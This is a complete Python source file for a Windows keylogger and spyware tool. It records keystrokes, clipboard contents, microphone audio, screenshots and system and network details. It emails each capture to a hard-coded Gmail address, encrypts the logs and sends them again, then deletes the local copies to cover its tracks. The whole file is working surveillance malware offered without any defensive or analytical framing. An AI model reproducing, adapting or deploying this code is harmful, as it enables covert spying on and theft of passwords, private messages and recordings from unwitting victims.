# Imports
from pynput.keyboard import Key, Listener

from cryptography.fernet import Fernet

from scipy.io.wavfile import write
import sounddevice as sd

from PIL import ImageGrab

from requests import get

import win32clipboard

import platform
import socket
import os

from mailer import send_mail_with_attachment

from dotenv import load_dotenv
load_dotenv()


# File names to store data
keys_info = "key_log.txt"
system_info = "system_info.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"

# Encrypted file names
system_info_e = 'e_system_info.txt'
clipboard_info_e = 'e_clipboard.txt'
keys_info_e = 'e_keys_log.txt'

# File path plus extension to add name
file_path = "C:\\Users\\nikhi\\Desktop\\Advanced-Keylogger"
extend_path = "\\"
file_merge = file_path+extend_path

# SYSTEM INFORMATION
def system_information():
    with open(file_path + extend_path + system_info, "a") as f:
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)
        try:
            external_ip = get('https://api.ipify.org').text
            f.write("Public IP Address: " + external_ip + "\n")
        except Exception:
            f.write("Couldn't get public IP address!\n")
        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + ip_addr + "\n\n")

        try:
            send_mail_with_attachment(system_info, file_path+extend_path+system_info, "nvombatkere@gmail.com")
        except:
            print("Mail Couldn't Be Sent")

# CLIPBOARD INFORMATION
def clipboard_information():
    try:
        with open(file_path + extend_path + clipboard_info, "a") as f:
            try:
                win32clipboard.OpenClipboard(0)
                clipboard_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                f.write("Clipboard Data: \n" + clipboard_data)
            except:
                print("Clipboard could not be copied")

            try:
                send_mail_with_attachment(clipboard_info, file_path+extend_path+clipboard_info, "nvombatkere@gmail.com")
            except:
                print("Mail Couldn't Be Sent")
    except:
        print("Clipboard Information Couldn't Be Captured")

# MICROPHONE INFORMATION
def sound_information():
    fs = 44100 # Sampling frequency
    duration = 5
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path+extend_path+audio_info, fs, recording)

    try:
        send_mail_with_attachment(audio_info, file_path+extend_path+audio_info, "nvombatkere@gmail.com")
    except:
        print("Mail Couldn't Be Sent")

# SCREENSHOT INFORMATION
def screenshot():
    screenshot = ImageGrab.grab(bbox=None, include_layered_windows=False,
                                all_screens=False, xdisplay=None)
    screenshot.save(file_path+extend_path+screenshot_info)

    try:
        send_mail_with_attachment(screenshot_info, file_path+extend_path+screenshot_info, "nvombatkere@gmail.com")
    except:
        print("Mail Couldn't Be Sent")

# KEY MONITORING & LOGGING
class logKeys:
    def __init__(self):
        self.count = 0
        self.keys = []

    # When a key is pressed
    def on_press(self, key):
        # Keep track of key presses and the number of keys pressed
        self.keys.append(key)
        self.count = self.count+1
        print("{0} pressed".format(key))
        # Write to file after every 15 key presses and reset variables
        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    # When a key is released
    def on_release(self, key):
        # Condition to exit keylogger
        if key==Key.esc:
            return False

    # Write the key presses to a file
    def write_file(self, keys):
        with open(file_path + extend_path + keys_info, "a") as f:
            for key in keys:
                # Format key to be readable
                formatted_key = str(key).replace("'", "")
                if formatted_key.find("space") > 0:
                    f.write("\n")
                # If not a special key then write to file otherwise ignore
                elif formatted_key.find("Key") == -1:
                    f.write(formatted_key)
    
    # Logs keypresses
    def log(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
        print("Logging Complete")

        try:
            send_mail_with_attachment(keys_info, file_path+extend_path+keys_info, "nvombatkere@gmail.com")
        except:
            print("Mail Couldn't Be Sent")

# FILE ENCRYPTION
def encrypt_files():
    files_to_encrypt = [file_merge+keys_info, file_merge+clipboard_info, file_merge+system_info]
    encrypted_file_names = [file_merge+keys_info_e, file_merge+clipboard_info_e, file_merge+system_info_e]

    cnt = 0
    key = os.environ.get("ENCRYPTION_KEY")

    for encrypting_file in files_to_encrypt:
        with open(files_to_encrypt[cnt], 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        with open(encrypted_file_names[cnt], 'wb') as f:
            f.write(encrypted)

        cnt += 1

    try:
        send_mail_with_attachment(keys_info_e, file_path+extend_path+keys_info_e, "nvombatkere@gmail.com")
        send_mail_with_attachment(system_info_e, file_path+extend_path+system_info_e, "nvombatkere@gmail.com")
        send_mail_with_attachment(clipboard_info_e, file_path+extend_path+clipboard_info_e, "nvombatkere@gmail.com")
    except:
        print("Mail Couldn't Be Sent")

# FILE DELETING
def delete_files():
    files = [system_info, clipboard_info, keys_info, audio_info, screenshot_info]
    encrypted_files = [system_info_e, clipboard_info_e, keys_info_e]
    
    for file in files:
        try:
            os.remove(file_merge+file)
        except Exception:
            print("File %s Not Found" %file)

    for file in encrypted_files:
        try:
            os.remove(file_merge+file)
        except Exception:
            print("Encrypted File %s Not Found" %file)


if __name__ == "__main__":
    # Listen for keypresses and implements functions collectively
    keyLog = logKeys()
    keyLog.log()
    
    # SYSTEM INFO
    system_information()
        
    # CLIPBOARD INFO
    clipboard_information()
    
    #SOUND INFO
    sound_information()
    
    # SCREENSHOT INFO
    screenshot()

    # ENCRYPT FILES
    encrypt_files()

    # DELETE FILES
    delete_files()